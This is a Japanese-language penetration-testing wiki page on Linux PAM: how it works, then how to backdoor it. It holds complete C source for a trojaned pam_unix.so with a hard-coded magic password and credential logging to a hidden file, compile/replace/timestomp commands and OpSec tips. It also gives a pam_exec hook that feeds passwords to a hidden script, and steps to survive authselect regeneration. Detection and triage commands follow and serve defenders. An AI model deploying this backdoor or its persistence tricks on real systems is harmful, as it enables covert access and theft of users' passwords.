# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本情報

**PAM (Pluggable Authentication Modules)** は、**コンピューターサービスへのアクセスを試みるユーザーの身元を検証する**セキュリティメカニズムとして機能し、さまざまな基準に基づいてアクセスを制御します。これはデジタルの門番に似ており、承認されたユーザーだけが特定のサービスを利用できるようにすると同時に、システムの過負荷を防ぐために利用を制限することもあります。

#### 設定ファイル

- **Solaris** はレガシーな中央ファイル `/etc/pam.conf` をサポートしていますが、現在のガイダンスでは `/etc/pam.d` 配下のサービスファイルが推奨されています。<sup>[[10]](#references)</sup>
- **Linux systems** ではディレクトリ方式が推奨されており、サービス固有の設定を `/etc/pam.d` 内に保存します。たとえば、login service の設定ファイルは `/etc/pam.d/login` にあります。<sup>[[1]](#references)</sup>

login service の PAM 設定例は、次のようになります。
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

これらの realm、つまり management group には、**auth**、**account**、**password**、**session** があり、それぞれ認証および session management プロセスの異なる側面を担当します。<sup>[[1]](#references)</sup>

- **Auth**: ユーザーの identity を検証します。多くの場合、password の入力を求めます。
- **Account**: account verification を処理し、group membership や時間帯による制限などの条件を確認します。
- **Password**: complexity checks や dictionary attacks prevention など、password の更新を管理します。
- **Session**: directory の mount や resource limits の設定など、service session の開始時または終了時の処理を管理します。

#### **PAM Module Controls**

Controls は module の success または failure への response を決定し、認証プロセス全体に影響を与えます。これには以下が含まれます。<sup>[[1]](#references)</sup>

- **Required**: required module が failure になると、後続のすべての module が確認された後に最終的に failure になります。
- **Requisite**: failure が発生すると、プロセスを直ちに終了します。
- **Sufficient**: それ以前の `required` module が failure になっていない場合、success を直ちに返し、同じ management group の残りの module を skip します。
- **Optional**: stack 内で唯一の module である場合にのみ failure を引き起こします。

#### Offensive Semantics That Matter

PAM の分析または変更時には、**挿入した rule の位置**によって、どの stack がそれを読み込むかが決まります。<sup>[[1]](#references)[[13]](#references)</sup>

- `include` と `substack` は他の file から rule を取り込むため、`sshd` の編集は SSH にのみ影響する一方、`system-auth`、`common-auth`、または別の shared stack の編集は複数の service に一度に影響する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>
- PAM は `[success=1 default=ignore]` のような bracketed controls もサポートします。これらは、`pam_unix.so` を明らかに置き換えるのではなく、custom check の success 後に 1 つ以上の module を **skip** するために abuse される可能性があります。<sup>[[1]](#references)</sup>
- `module-path` には **absolute** (`/usr/lib/security/pam_custom.so`) または PAM module の default directory に対する **relative** な path を指定できます。modern Linux system では、実際の directory は `/lib/security`、`/lib64/security`、`/usr/lib/security`、または `/usr/lib/x86_64-linux-gnu/security` のような multiarch path であることがよくあります。<sup>[[1]](#references)[[14]](#references)</sup>

Quick operator takeaway: patch を適用する前に、必ず **full service graph** を map してください。たとえば、一部の distro では `sshd -> password-auth -> system-auth`、別の distro では `sshd -> system-remote-login -> system-login -> system-auth` となるため、同じ 1 行の implant が意図した範囲よりはるかに広く fan out する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

複数の auth module がある setup では、プロセスは厳密な order に従います。`pam_securetty` module が login terminal を unauthorized と判断すると、root login は block されますが、その module が "required" であるため、すべての module の処理は継続されます。`pam_env` は environment variables を設定し、user experience の向上に役立つ可能性があります。`pam_ldap` と `pam_unix` module は連携して user を authenticate します。このとき `pam_unix` は以前に提供された password の使用を試みるため、authentication method の efficiency と flexibility が向上します。<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Linux の high-value environment における classic persistence trick は、正規の PAM library を trojanised drop-in と **swap する**ことです。PAM stack が `pam_unix.so` を load する host では、SSH または console の authentication がその `pam_sm_authenticate()` entry point を呼び出す可能性があります。malicious replacement は credentials を capture したり、*magic* password bypass を実装したりできます。<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
以下の sketch では、Linux-PAM の `pam_sm_authenticate()` service entry point と、authentication token にアクセスするための `pam_get_authtok()` を使用します。<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compileして stealth-replace を行う（replacement/timestomp pattern は Unit 42 により文書化されています）。wrapper にハードコードされた backup path と、以下の commands の両方を、target の実際の PAM module directory に合わせて調整してください:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – 認証モジュールが部分的に書き込まれた状態で残らないように、完全な library を一時ファイルに書き込み、所定の場所に rename する。
2. Unit 42 の AuthDoor 分析では `/usr/bin/.dbus.log` のような path が確認されているため、hunting indicator としても有用です。<sup>[[2]](#references)</sup>
3. PAM stack が期待する entry point（たとえば `pam_sm_authenticate` や `pam_sm_setcred`）を保持し、他の管理操作が引き続き機能するようにします。<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
package-integrity check では、RPM がインストール済みファイルの metadata を検証し、`debsums -s` が checksum error を報告し、triage block 内の `dpkg -S` が package ownership を照会します。また、audit watch syntax は path への書き込みと attribute change を記録します。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` の MD5/SHA256 を distro package と比較します。
* `rpm -V pam` または `debsums -s libpam-modules` を使用すると、手動で hashing せずに置き換えられた library を検出できます。
* `/lib/security/` 配下に world-writable な file や通常とは異なる ownership がないか確認します。
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* PAM config で予期しない module を Grep します: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise または threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### `pam_exec`を悪用したpersistence
`pam_unix.so`を置き換える代わりに、`/etc/pam.d/sshd`へ`pam_exec`の行を追加するという、より軽微な方法があります。これにより、そのPAM行に到達した呼び出しでヘルパーが実行され、通常のstackはそのまま維持されます。<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は、`PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY`、`PAM_TYPE` などの環境変数で PAM メタデータを受け取ります。`expose_authtok` を指定すると、helper は `auth` または `password` フェーズ中に、`stdin` から最大 `PAM_MAX_RESP_SIZE` バイトのパスワードを読み取れます。helper を real UID ではなく effective UID で実行する場合は、`seteuid` を追加します。<sup>[[4]](#references)</sup>

以下は、`pam_exec` で文書化されているモジュールタイプと `type=` filter に関する実用的な注意事項です。<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` は、ソケットの再オープンや detached daemon の spawn などの **post-login actions** に適しています。
- `auth optional pam_exec.so quiet expose_authtok ...` は、session が開く前に実行されるため、**credential capture** に通常使用されます。
- `type=session` または `type=auth` を使用すると、実行を特定の PAM フェーズに限定し、不要な二重実行を回避できます。

### distro のツールに耐える: `authselect`

`authselect` を使用する RHEL および Fedora 系のシステムでは、`/etc/pam.d/system-auth` や `/etc/pam.d/password-auth` などの生成ファイルを直接編集しても、**`authselect` によって上書きされる**可能性があります。永続化するには、通常 `/etc/authselect/custom/<profile>/` にあるアクティブな custom profile に patch を適用し、その後で再選択します。<sup>[[5]](#references)[[19]](#references)</sup>

root がある場合の一般的な workflow は次のとおりです。<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
これは offense と triage の両方に関係します。`/etc/pam.d/system-auth` に `Generated by authselect` および `Do not modify this file manually` という banner が含まれている場合、実際の persistence point は `/etc/pam.d/` ではなく、`/etc/authselect/custom/` 配下に存在する可能性があります。<sup>[[5]](#references)</sup>

### Recent tradecraft seen in the wild

2025年に公開された **Plague** Linux backdoor に関する最近の報告では、同じ中核的なアイデアがさらに発展していました。そこでは、**static bypass password** を備えた悪意のある PAM component に加え、login 後の session traces を減らすため、SSH関連の environment variables と shell history（`HISTFILE=/dev/null`）の cleanup も行われていました。<sup>[[3]](#references)</sup> これは有用な hunting pattern です。backdoor logic は PAM 内に存在する一方、stealth artifacts は authentication が成功した**後**にのみ現れる可能性があるためです。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Covert OperatorのPlaybook：Global Telecom NetworksへのInfiltration - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague：Linux向けに新たに発見されたPAMベースのBackdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselectを使用したuser authenticationの設定 - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4でのAuthenticationの管理](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [System-Level Authentication Guide - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu package file list：libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
